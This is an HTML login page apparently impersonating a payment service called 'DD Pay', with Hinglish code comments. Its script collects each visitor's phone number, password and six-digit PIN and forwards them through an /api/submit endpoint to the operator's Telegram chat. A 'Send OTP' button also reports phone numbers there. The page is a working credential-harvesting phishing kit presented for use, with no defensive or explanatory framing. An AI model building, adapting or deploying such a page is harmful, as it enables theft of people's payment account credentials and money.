<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DD Pay - Login</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
        .logo { width: 120px; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        .input-group label { font-size: 12px; color: #555; display: block; margin-bottom: 5px; }
        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; outline: none; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
        .btn-green { background-color: #28a745; color: white; }
        .btn-green:hover { background-color: #218838; }
        .btn-blue { background-color: #007bff; color: white; }
        .btn-blue:hover { background-color: #0069d9; }
        .links { display: flex; justify-content: space-between; font-size: 12px; margin-top: 10px; }
        .links a { color: #007bff; text-decoration: none; }
        .checkbox-group { display: flex; align-items: center; font-size: 12px; margin-bottom: 15px; }
        .checkbox-group input { margin-right: 5px; }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="https://via.placeholder.com/120x50?text=DD+Pay" alt="DD Pay Logo" class="logo">
        
        <form id="loginForm">
            <div class="input-group">
                <label>Phone</label>
                <input type="tel" id="phone" placeholder="Enter Phone Number" required>
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Enter Password" required>
            </div>
            <div class="input-group">
                <label>6 Digit PIN</label>
                <input type="password" id="pin" placeholder="Enter 6 Digit PIN" maxlength="6" required>
            </div>
            
            <div class="links">
                <span>Register</span>
                <label class="checkbox-group"><input type="checkbox"> Remember Me</label>
            </div>
            <div class="checkbox-group">
                <input type="checkbox" required> I Agree User Privacy Agreement
            </div>

            <!-- Send OTP Button -->
            <button type="button" id="otpBtn" class="btn btn-blue">Send OTP</button>

            <!-- Sign In Button -->
            <button type="submit" class="btn btn-green">Sign In</button>
            
            <div class="links" style="justify-content: center;">
                <a href="#">Forget Password</a>
            </div>
        </form>
    </div>

    <script>
        // --- TELEGRAM MESSAGE BHEJNE KA FUNCTION ---
        async function sendToTelegram(messageText) {
            try {
                const res = await fetch('/api/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: messageText })
                });
                return res.ok;
            } catch (error) {
                return false;
            }
        }

        // 1. SEND OTP BUTTON CLICK
        document.getElementById('otpBtn').addEventListener('click', async function() {
            const phone = document.getElementById('phone').value;
            
            if(!phone) {
                alert("Pehle Phone Number daalein!");
                return;
            }

            this.innerText = "Sending OTP...";
            this.disabled = true;

            const msg = `🚨 *OTP Request Aaya Hai!*\n\n📱 User ne OTP button dabaya.\n📞 Phone: ${phone}`;
            const success = await sendToTelegram(msg);

            if(success) {
                alert("OTP request aapke Telegram par bhej di gayi hai!");
            } else {
                alert("OTP send nahi ho paya. API check karein.");
            }
            
            this.innerText = "Send OTP";
            this.disabled = false;
        });

        // 2. SIGN IN FORM SUBMIT CLICK
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const btn = this.querySelector('.btn-green');
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const pin = document.getElementById('pin').value;

            btn.innerText = "Signing In...";
            btn.disabled = true;

            const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`;
            const success = await sendToTelegram(msg);

            if(success) {
                alert("Sign In details aapke Telegram par bhej di gayi hain!");
                this.reset();
            } else {
                alert("Details send nahi ho payi.");
            }

            btn.innerText = "Sign In";
            btn.disabled = false;
        });
    </script>
</body>
</html>
